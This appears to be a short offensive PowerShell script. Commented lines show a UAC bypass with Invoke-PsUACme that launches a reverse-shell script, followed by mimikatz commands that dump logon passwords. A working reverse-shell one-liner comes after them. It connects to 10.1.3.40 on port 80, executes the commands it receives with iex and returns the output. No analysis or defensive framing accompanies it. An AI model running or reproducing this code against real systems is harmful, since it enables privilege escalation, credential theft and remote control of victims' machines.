#PS C:\temp> . .\Invoke-PsUACme.ps1
#PS C:\temp> Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file c:\temp\reverse.ps1"
#Using OOBE method
#PS C:\test> .\mimi.ps1
#mimikatz(powershell) # privilege::debug
#mimikatz(powershell) # sekurlsa::logonpasswords


$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

